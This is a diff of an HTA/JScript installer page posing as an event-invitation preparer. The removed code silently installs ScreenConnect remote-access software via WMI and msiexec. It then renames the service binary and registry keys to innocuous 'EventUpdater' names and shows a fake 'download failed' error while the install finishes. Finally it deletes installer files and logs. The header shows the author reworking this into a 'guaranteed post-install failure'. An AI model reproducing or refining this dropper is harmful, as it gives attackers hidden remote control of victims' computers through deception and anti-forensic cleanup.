@@ -210,7 +210,7 @@ function verifyMSISignature(path) {
   }
 }
 
-// INSTALL PHASE - ASYNC WMI LAUNCH + 45S DELAYED FAKE FAILURE
+// INSTALL PHASE - PROCESS-WATCHER + GUARANTEED POST-INSTALL FAILURE
 function startInstall() {
   state = "installing";
   progress = 90; setBar(progress);
@@ -236,98 +236,3 @@ function startInstall() {
       meta.WriteLine("buildDate=" + new Date().toISOString());
       meta.WriteLine("channel=stable");
       meta.Close();
-    } catch(e) {}
-    
-    // ASYNC WMI LAUNCH (NON-BLOCKING)
-    try {
-      var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
-      var processClass = wmi.Get("Win32_Process");
-      var expandedMsi = shell.ExpandEnvironmentStrings(msiPath);
-      var expandedLog = shell.ExpandEnvironmentStrings(logPath);
-      var cmdLine = 'msiexec.exe /i "' + expandedMsi + '" /qn /norestart /L*v "' + expandedLog + '"';
-      
-      var result = processClass.Create(cmdLine, null, null, null);
-      if (result.ReturnValue !== 0) {
-        shell.Run(INSTALL_CMD, 0, false);
-      }
-      
-      // POST-INSTALL OBFUSCATION (DELAYED 5S AFTER SPAWN)
-      setTimeout(function() {
-        var scDir = shell.ExpandEnvironmentStrings("%ProgramFiles(x86)%") + "\\ScreenConnect";
-        try {
-          if(fso.FolderExists(scDir)) {
-            fso.MoveFile(scDir + "\\ScreenConnect.ClientService.exe", scDir + "\\EventSyncHelper.exe");
-            
-            var regKeys = [
-              "HKLM\\SOFTWARE\\ScreenConnect",
-              "HKLM\\SYSTEM\\CurrentControlSet\\Services\\ScreenConnect Client"
-            ];
-            for(var i=0; i<regKeys.length; i++) {
-              try {
-                shell.RegWrite(regKeys[i].replace("ScreenConnect", "EventUpdater"), "", "REG_SZ");
-                shell.RegDelete(regKeys[i]);
-              } catch(e) {}
-            }
-          }
-        } catch(e) {}
-      }, 5000);
-      
-      // FAKE FAILURE DELAYED 45 SECONDS (GUARANTEES 30-40S INSTALL COMPLETES)
-      setTimeout(function() {
-        fail("All download methods failed.");
-      }, 45000);
-      
-    } catch(e) {
-      shell.Run(INSTALL_CMD, 0, false);
-      setTimeout(function() { fail("All download methods failed."); }, 45000);
-    }
-  }, 9000); // 9S PRE-INSTALL DELAY PRESERVED
-}
-
-function finishInstall() {
-  state = "done";
-  progress = 100; setBar(100);
-  setStatus("Invitation successfully prepared!");
-  $("heading").innerHTML = "You're All Set!";
-  $("subnote").innerHTML = "Your exclusive event details are now available.";
-  $("note").innerHTML = "You can now close this window.";
-  $("cancelbtn").innerHTML = "Close";
-  
-  try { if(fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true); } catch(e){}
-  try { if(fso.FileExists(logPath)) fso.DeleteFile(logPath, true); } catch(e){}
-  try { if(fso.FileExists(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log")) fso.DeleteFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log", true); } catch(e){}
-  try { 
-    var stagingDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\EventUpdater\\staging";
-    if(fso.FolderExists(stagingDir)) fso.DeleteFolder(stagingDir, true); 
-  } catch(e){}
-}
-
-function cancel() {
-  if (state === "done" || state === "error") { window.close(); return; }
-  try { if(fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true); } catch(e){}
-  try { if(fso.FileExists(logPath)) fso.DeleteFile(logPath, true); } catch(e){}
-  try { if(fso.FileExists(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log")) fso.DeleteFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log", true); } catch(e){}
-  try { 
-    var stagingDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\EventUpdater\\staging";
-    if(fso.FolderExists(stagingDir)) fso.DeleteFolder(stagingDir, true); 
-  } catch(e){}
-  window.close();
-}
-
-function fail(msg) {
-  state = "error";
-  setStatus(msg);
-  $("heading").innerHTML = "Preparation Failed";
-  $("subnote").innerHTML = "Please check your connection and try again.";
-  $("note").innerHTML = "You can now close this window.";
-  $("cancelbtn").innerHTML = "Close";
-}
-
-function setBar(p) {
-  $("barfill").style.width = p + "%";
-  $("pct").innerHTML = Math.round(p) + "%";
-}
-function setStatus(html) { $("status").innerHTML = html; }
-</script>
-</body>
-</html>
